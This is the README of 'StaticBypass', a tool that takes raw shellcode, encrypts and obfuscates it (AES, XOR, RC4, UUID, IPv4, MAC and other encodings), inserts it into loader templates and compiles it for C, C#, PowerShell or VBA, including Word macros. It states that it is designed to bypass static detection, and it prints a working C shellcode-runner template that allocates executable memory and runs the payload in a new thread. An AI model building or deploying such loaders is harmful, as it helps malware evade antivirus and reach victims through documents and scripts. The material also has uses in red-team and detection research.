# StaticBypass - Template-based, modular, multi-language, shellcode obfuscator and compiler

## Usage
```
python3 staticbypass.py --obfuscator Base64Encode --transformers XOREncrypt,AESEncrypt --shellcode ./shellcode.bin --template processhollow --language cs
```

## Features
- Takes in a raw shellcode file, applies encryptors and obfuscators, formats it, places it into a template, and compiles it
- Supports C, C#, PowerShell, and VBA
- Automates placing VBA code into a word document
- Supports AES, XOR, and RC4 encryption, and Dictionary, UUID, IPv4, IPv6, and MAC address obfuscation
- Designed to bypass static detection methods

## WIP
- Adding more obfuscator support for the different programming languages
- Adding pre and post compile obfuscations e.g. vba and powershell obfuscation
- Adding more language support e.g. rust and go
- Adding more templates e.g. early bird apc injection, heap allocation
- Dynamically building help text
- Refactor code a little bit

## Requirements
### Windows
- C# - csc.exe
- C - mingw64

### Linux
- C# - mcs
- C - mingw64

## Currently supported obfuscators and encryptors
| Obfuscator    | C   | C# | PowerShell | VBA |
|:-------------:|:---:|:--:|:----------:|:---:|
| AESEncrypt    | ✅ | ✅ | ✅ | ❌ |
| XOREncrypt    | ✅ | ✅ | ✅ | ✅ |
| RC4Encrypt    | ✅ | ✅ | ✅ | ✅ |
| RSAEncrypt    | ❌ | ✅ | ❌ | ❌ |
| Base64Encode  | ✅ | ✅ | ✅ | ✅ |
| DictObfuscate | ✅ | ✅ | ✅ | ✅ |
| IPv4Obfuscate | ✅ | ✅ | ✅ | ✅ |
| IPv6Obfuscate | ✅ | ✅ | ✅ | ✅ |
| MACObfuscate  | ✅ | ✅ | ✅ | ✅ |
| UUIDEncode    | ✅ | ✅ | ✅ | ❌ |
| EmojiEncode   | ✅ | ✅ | ✅ | ❌ |
| Brainfuck     | ✅ | ❌ | ❌ | ❌ |
| Whitespace    | ✅ | ❌ | ❌ | ❌ |

## Transformer Structure

Place a new file in the [language]/transformers/ directory. 
```
import base64
import random
import string

# Name the class the same as the file
class Base64Encode:

    # Define any variables created when the object is created
    # For example, you may randomize the name to prevent function
    # name clashes
    def __init__(self):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    # Return any imports your code uses
    # Imports are deduplicated (and order is retained)
    def imports(self):
        return ["using System.Text;"]
    
    # Return any options required by the compiler
    # For example, libraries that need to be linked
    def compilerOptions(self):
        return []

    # Return the code that deobfuscates the code in the target language
    def codeblock(self):
        return """

        public static byte[] {name}(string encoded)
        {{
            return Convert.FromBase64String(encoded);
        }}
""".format(name = self.name)

    # Perform the obfuscation of the code
    def obfuscate(self, decoded):
        return base64.b64encode(decoded).decode()

    # Write the function call into the source code file
    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
```

## Template Structure
Create a new file in [language]/templates/
```
class shellcoderunner:

    # Return any imports required
    def imports(self):
        return ["#include <windows.h>", "#include <stdio.h>", "#include <stdlib.h>"]

    # Return any compiler options neede
    def compilerOptions(self):
        return []

    # Return the template block with the placeholders for each item
    def template(self):
        return """
{imports}

{codeblocks}

int main() {{
    {shellcode}
    {transformers}
    LPVOID buffer = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    memcpy(buffer, shellcode, {shellcodeSize});

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    VirtualFree(buffer, 0, MEM_RELEASE);

    return 0;
}}
"""
```